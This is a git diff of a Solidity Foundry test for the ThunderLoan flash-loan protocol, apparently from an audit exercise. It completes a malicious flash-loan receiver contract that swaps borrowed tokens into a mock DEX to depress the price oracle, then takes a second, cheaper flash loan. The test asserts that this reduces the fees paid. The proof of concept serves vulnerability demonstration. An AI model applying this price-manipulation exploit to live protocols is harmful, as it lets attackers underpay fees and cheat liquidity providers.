@@ -109,25 +109,27 @@ contract ThunderLoanTest is BaseTest {
         // 2. fund TSwap DEX
         vm.startPrank(liquidityProvider); // create an investor
         tokenA.mint(liquidityProvider, 100e18); // create investor balance
+        assertEq(tokenA.balanceOf(liquidityProvider), 100e18);
         tokenA.approve(address(tswapPool), 100e18); // Approve the TSwap contract to spend tokens
-        weth.mint(address(tswapPool), 100e18); // create weth balance
+        weth.mint(address(liquidityProvider), 100e18); // create weth balance
         weth.approve(address(tswapPool), 100e18);
         BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
         vm.stopPrank();
         // Ratio 100 weth & 100 tokenA
         // price 1:1
+        assert(weth.balanceOf(address(tswapPool)) == 100e18);
+        assert(tokenA.balanceOf(address(tswapPool)) == 100e18);
 
         // 3. fund thunderLoan (pool)
         // set tokenA as an allowed token on thunderLoan
         vm.prank(thunderLoan.owner()); // create owner permission
         thunderLoan.setAllowedToken(tokenA, true); // greenlight tokenA
         // fund
-        vm.startPrank(liquidityProvider); // have the investor do:...
         tokenA.mint(liquidityProvider, 1000e18); // create investor balance
+        assertEq(tokenA.balanceOf(liquidityProvider), 1000e18);
+
+        vm.startPrank(liquidityProvider); // have the investor do:...
         tokenA.approve(address(thunderLoan), 1000e18); // approve for transfer
-        // console.log("investor balance: ", tokenA.balanceOf(liquidityProvider));
-        // console.log("pool balance: ", tokenA.balanceOf(address(tswapPool)));
-        // console.log("thunderLoan weth balance: ", weth.balanceOf(address(tswapPool)));
         thunderLoan.deposit(tokenA, 1000e18); // deposit
         vm.stopPrank();
 
@@ -146,6 +148,18 @@ contract ThunderLoanTest is BaseTest {
         // should give: 0.296147410319118389 weth
 
         uint256 amountToBorrow = 50e18;
+        MalicousFlashLoanReceiver flr = new MalicousFlashLoanReceiver(
+            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
+        );
+
+        vm.startPrank(user);
+        tokenA.mint(address(flr), 50e18);
+        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
+        vm.stopPrank();
+
+        uint256 attackFee = flr.feeOne() + flr.feeTwo();
+        console.log("attack fee is: ", attackFee, " weth");
+        assert(normalFeeCost < attackFee);
     }
 
     function testConsoleLog() public view {
@@ -158,28 +172,46 @@ contract MalicousFlashLoanReceiver is IFlashLoanReceiver {
     address repayAddress;
     BuffMockTSwap tswapPool;
     bool attacked = false;
+    uint256 public feeOne;
+    uint256 public feeTwo;
 
-    constructor(address _tswapPool, address _thunderLoan, address _repayAddress, BuffMockTSwap _tswapPool) {
+    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
         tswapPool = BuffMockTSwap(_tswapPool);
         thunderLoan = ThunderLoan(_thunderLoan);
         repayAddress = _repayAddress;
     }
+    // the flashloan receiver (interface) so if we call thunderloan.flashloan() this runs:
 
     function executeOperation(
         address token, // the token that's being borrowed
         uint256 amount,
         uint256 fee,
-        address initiator,
-        bytes calldata params
+        address, /* initiator */
+        bytes calldata /*params*/
     )
         external
-        returns (bool); {
-            if(!attacked) {
-        // 1. swap tokenA borrowed for weth
-       // 2. take out ANOTHER flash loan, to show the difference in fees
-
-    } else {
-     
+        returns (bool)
+    {
+        if (!attacked) {
+            // 1. swap tokenA borrowed for weth
+            // 2. take out ANOTHER flash loan, to show the difference in fees
+            feeOne = fee;
+            attacked = true;
+            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
+            IERC20(token).approve(address(tswapPool), 50e18);
+            // tanks the price!!
+            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
+            // we call a second flashloan, so we can see how much cheaper it is
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
+            // repay
+            IERC20(token).approve(address(thunderLoan), amount + fee);
+            thunderLoan.repay(IERC20(token), amount + fee);
+        } else {
+            // calculate the fee and repay
+            feeTwo = fee;
+            IERC20(token).approve(address(thunderLoan), amount + fee);
+            thunderLoan.repay(IERC20(token), amount + fee);
+        }
+        return true;
     }
-}
 }
